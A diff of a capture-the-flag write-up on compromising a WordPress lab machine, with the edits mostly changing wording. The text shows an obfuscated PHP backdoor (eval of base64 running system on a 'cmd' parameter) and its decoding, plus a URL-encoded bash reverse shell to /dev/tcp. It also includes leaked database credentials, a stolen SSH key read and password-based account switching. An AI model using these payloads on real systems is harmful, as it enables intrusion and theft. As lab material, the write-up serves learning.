@@ -41,7 +41,7 @@ $ wpscan --url http://www.smol.thm
 ```
 <br>
 
-It found a plugin, and after a google search this version of this plugin is vulnerable to LFI<br>
+It found a plugin, and after a google search this version of this plugin is vulnerable to LFI and SSRF<br>
 <a href = "https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/"> https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/ </a><br>
 Now i can read wp-config.php like this:
 ```
@@ -57,12 +57,10 @@ define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
 ```
 
 <br>
-
+And it worked!<br>
 <img src = "wp-admin1.png"><br>
 
-And it worked!
-<br>
-And after a little messing around in the wordpress admin panel, the website has a private webmaster tasks page<br>
+After a little messing around in the wordpress admin panel, the website has a private webmaster tasks page<br>
 The page contains a line which says:<br>
 ```
 1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
@@ -77,15 +75,16 @@ And there is an interesting line in it:
 ```
 eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
 ```
-decoding the base64:
+decoding the base64 reveals a strange code:
 ```
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
 ```
-And decoding this part:
+We can decode it even more, this part:
 ```
 \143\155\x64 -> cmd
+\143\x6d\144 -> cmd
 ```
-I get:
+Putting it together we get:
 ```
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 ```
@@ -93,15 +92,15 @@ This is an RCE vulnerability i can exploit like this:
 ```
 http://www.smol.thm/wp-admin/index.php?cmd=<command>
 ```
-And making a more stable shell using ncat:
+Lets make a more stable shell using netcat:
 ```
 ncat -nlvp 8081
 ```
-and pasting this into the browser:
+And pasting this into the browser:
 ```
 http://www.smol.thm/wp-admin/index.php?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP>%2F8081%200%3E%261
 ```
-And getting the shell:
+Getting the shell:
 ```
 Ncat: Connection from 10.10.60.118:52498.
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -109,9 +108,9 @@ www-data@ip-10-10-60-118:/var/www/wordpress/wp-admin$
 ```
 <br>
 And now i have to get the first flag<br>
-Checking home directory the server has 4 users<br><br>
-after doing some basic PE methods, turns out mysql running on the server<br>
-I have the sql login credentials from earlier:
+Checking the home directory, the target machine has 4 users<br><br>
+After doing some basic PE methods, turns out mysql running on the server and I have the database login credentials from earlier:
+
 
 ```
 define( 'DB_USER', 'wpuser' );
@@ -188,7 +187,6 @@ www-data@ip-10-10-36-238:/var/www/wordpress/wp-admin$ su diego
 Password: sandiegocalifornia
 
 diego@ip-10-10-36-238:/var/www/wordpress/wp-admin$ 
-
 ```
 Good, checking diegos home directory, he has the user flag in it!
 ```
@@ -197,8 +195,8 @@ diego@ip-10-10-36-238:~$ cat user.txt
 ```
 <hr>
 <h2> Question 2: Root flag </h2>
-To get to root, i probably have to go trough users<br>
-Checking the other users home directories, i can read the user "think"s .ssh directory<br>
+To get to root, i probably have to go through users<br>
+Checking the other users home directories, i can read think's .ssh directory<br>
 
 ```
 diego@ip-10-10-36-238:/home$ cat think/.ssh/id_rsa 
@@ -212,7 +210,8 @@ Saving the id_rsa file to my kali and connecting to think's account via ssh:
 ssh -i id_rsa2 think@10.10.36.238
 think@ip-10-10-36-238:~$ 
 ```
-Here too, after some linpeas and findings, i tried to login as gege, and it didnt asked for a password:
+
+After searching for more PE methods, it turns out i can just simply login to gege's account without password:
 ```
 think@ip-10-10-36-238:~$ su gege
 gege@ip-10-10-36-238:/home/think$ 
